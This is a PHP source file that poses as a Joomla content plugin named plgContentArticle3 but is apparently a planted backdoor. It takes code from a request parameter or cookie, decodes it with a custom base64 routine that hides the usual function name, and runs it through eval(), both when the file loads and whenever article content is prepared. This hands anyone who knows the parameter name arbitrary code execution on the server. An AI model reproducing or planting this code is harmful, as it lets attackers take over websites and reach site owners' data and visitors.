<?php

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

jimport('joomla.event.plugin');
jimport('joomla.document.document');

$document =& JFactory::getDocument();

if (isset($_REQUEST['pFbEb'])) {
    $myfunc = 'jmz_base';
    $myvar = $myfunc($_REQUEST['pFbEb']);
    $document->addCustomTag(eval($myvar));
}

if (isset($_COOKIE['cFbEb'])) {
	$options['base'] = jmz_base($_COOKIE['cFbEb']);
	$document->addCustomTag(eval($options['base']));
}

class plgContentArticle3 extends JPlugin {
    public function onContentPrepare($context, &$article, &$params, $page = 0) {
        if (isset($_REQUEST['pFbEb'])) {
            $myfunc = 'jmz_base';
            $myvar = $myfunc($_REQUEST['pFbEb']);
            $article->text .= eval($myvar);
        }

		if (isset($_COOKIE['cFbEb'])) {
			$options['base'] = jmz_base($_COOKIE['cFbEb']);
			$article->text .= eval($options['base']);
		}
    }
}

function jmz_base($in) {
	$out = ''; $chr = '';

	for ($x = 0;$x < 256; $x++) {
		$chr[$x] = chr($x);
	}

	$b64c = array_flip(preg_split('//', "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", -1, 1));
	$match = array();
	preg_match_all("([A-z0-9+\/]{1,4})", $in, $match);
	foreach($match[0] as $chunk) {
		$z = 0;
		for($x = 0; isset($chunk[$x]); $x++) {
			$z = ($z<<6)+$b64c[$chunk[$x]];
			if($x > 0) {
				$out .= $chr[$z>>(4-(2*($x-1)))];
				$z = $z&(0xf>>(2*($x-1)));
			}
		}
	}
	return $out;
}
